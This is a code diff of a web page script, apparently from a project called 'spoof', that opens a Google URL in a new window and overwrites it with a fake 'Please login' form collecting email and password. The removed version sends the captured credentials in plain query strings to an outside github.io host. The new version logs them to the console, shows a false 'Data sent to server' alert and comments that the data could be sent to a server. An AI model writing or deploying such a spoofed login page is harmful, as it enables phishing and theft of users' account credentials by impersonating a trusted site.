@@ -13,37 +13,34 @@
 
     <script>
         function go() {
-            // Open Google in a new tab (Google will not be modified)
-            var x = window.open('https://www.google.com/csi'); 
-
+            var x = window.open('https://www.google.com/csi'); // Open a target URL (Google)
+            
             setTimeout(function() {
-                // Open a blank page to simulate the fake login page
-                var fakeLoginWindow = window.open('https://www.google.com/csi'); 
+                // Change the body content of the opened window to simulate a fake login page
+                x.document.body.innerHTML = '<h1>Please login</h1>';
+                x.document.body.innerHTML += 'Email: <input id="email"><br>';
+                x.document.body.innerHTML += 'Pass: <input id="pass" type="password"><br>';
+                x.document.body.innerHTML += '<button onclick="sendData()">Login</button>';
 
-                setTimeout(function() {
-                    // Change the body content of the opened window to simulate a fake login page
-                    fakeLoginWindow.document.body.innerHTML = '<img src="data:image/png;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wB..." />'; // Placeholder image
-                    fakeLoginWindow.document.body.innerHTML += '<h1>Please login</h1>';
-                    fakeLoginWindow.document.body.innerHTML += 'Email: <input id="email"><br>';
-                    fakeLoginWindow.document.body.innerHTML += 'Pass: <input id="pass" type="password"><br>';
-                    fakeLoginWindow.document.body.innerHTML += '<button onclick="sendData()">Login</button>';
+                // Function to send the collected data without redirection
+                function sendData() {
+                    var email = document.getElementById('email').value;
+                    var password = document.getElementById('pass').value;
 
-                    // Function to send the collected data to the custom server or redirect to response page
-                    function sendData() {
-                        var email = document.getElementById('email').value;
-                        var password = document.getElementById('pass').value;
-
-                        // Check if both email and password are filled
-                        if (email === "" || password === "") {
-                            alert("Please enter both email and password.");
-                            return; // Prevent sending empty data
-                        }
-
-                        // Redirect to response page with data (query string) - No encoding
-                        window.location.href = `https://ecdnts-del.github.io/spoof/respon.html?email=${email}&password=${password}`;
+                    // Check if both email and password are filled
+                    if (email === "" || password === "") {
+                        alert("Please enter both email and password.");
+                        return; // Prevent sending empty data
                     }
-                }, 2000); // Simulate page load time before altering the blank page
-            }, 3000); // Wait for 3 seconds before opening the blank page
+
+                    // Log the data to the console (no redirect)
+                    console.log("Email:", email);
+                    console.log("Password:", password);
+
+                    // Optionally, you can do more here (send data to a server, etc.)
+                    alert('Data sent to server');
+                }
+            }, 3000); // Wait for 3 seconds to simulate the page load time
         }
     </script>
 </body>
